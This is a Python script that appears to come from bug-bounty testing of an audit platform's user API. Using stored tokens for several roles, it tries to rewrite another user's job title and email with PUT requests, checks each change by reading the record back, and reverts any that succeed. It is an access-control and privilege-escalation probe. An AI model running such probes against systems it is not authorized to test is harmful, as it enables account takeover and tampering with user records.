import json,subprocess,os
H=os.environ['H']; BB=os.environ['BB']
TA=open('/tmp/tok_A').read().strip()
def req(method,path,body=None,tok=None):
    cmd=['curl','-s','-m','40','-o','/tmp/b','-w','%{http_code}','-X',method,H+path,
         '-H','token: '+(tok or TA),'-H',BB,'-H','Content-Type: application/json',
         '-H','X-Auditboard-Product: System']
    if body is not None: cmd+=['-d',json.dumps(body)]
    return subprocess.run(cmd,capture_output=True,text=True).stdout.strip(), open('/tmp/b',encoding='utf-8',errors='replace').read()
def user(uid,tok=None):
    c,b=req('GET',f'/api/v1/users/{uid}',tok=tok)
    try: return json.loads(b)['users'][0]
    except: return {}
TARGET=230
print("=== BASELINE user 230 ===")
u=user(TARGET)
print(f"  email={u.get('email')!r} job_title={u.get('job_title')!r} role={u.get('role_id')} updated={u.get('updated_at')}")
print()
print("=== each role attempts job_title write; verify by READ-BACK ===")
for role,f in [('Owner(231)','/tmp/tok_A'),('Reviewer(171)','/tmp/tok_Reviewer'),
               ('Tester(170)','/tmp/tok_Tester'),('ExtAuditor(172)','/tmp/tok_ExternalAuditor')]:
    try: tok=open(f).read().strip()
    except: print(f"  {role:18} no token"); continue
    before=user(TARGET).get('job_title')
    c,b=req('PUT',f'/api/v1/users/{TARGET}',{"user":{"job_title":f"ZX-{role}"}},tok=tok)
    after=user(TARGET).get('job_title')
    landed = after!=before
    print(f"  {role:18} PUT={c}  before={before!r} after={after!r}  {'*** LANDED ***' if landed else 'no change'}")
    if landed:
        req('PUT',f'/api/v1/users/{TARGET}',{"user":{"job_title":before or ""}},tok=TA)
print()
print("=== each role attempts EMAIL write; verify by READ-BACK ===")
for role,f in [('Owner(231)','/tmp/tok_A'),('Reviewer(171)','/tmp/tok_Reviewer'),
               ('Tester(170)','/tmp/tok_Tester'),('ExtAuditor(172)','/tmp/tok_ExternalAuditor')]:
    try: tok=open(f).read().strip()
    except: continue
    before=user(TARGET).get('email')
    c,b=req('PUT',f'/api/v1/users/{TARGET}',{"user":{"email":f"zx-{role.split('(')[0].lower()}@bugcrowdninja.com"}},tok=tok)
    after=user(TARGET).get('email')
    landed = after!=before
    print(f"  {role:18} PUT={c}  before={before!r} after={after!r}  {'*** LANDED ***' if landed else 'no change'}")
    if landed:
        req('PUT',f'/api/v1/users/{TARGET}',{"user":{"email":before}},tok=TA)
        print(f"      reverted -> {user(TARGET).get('email')!r}")
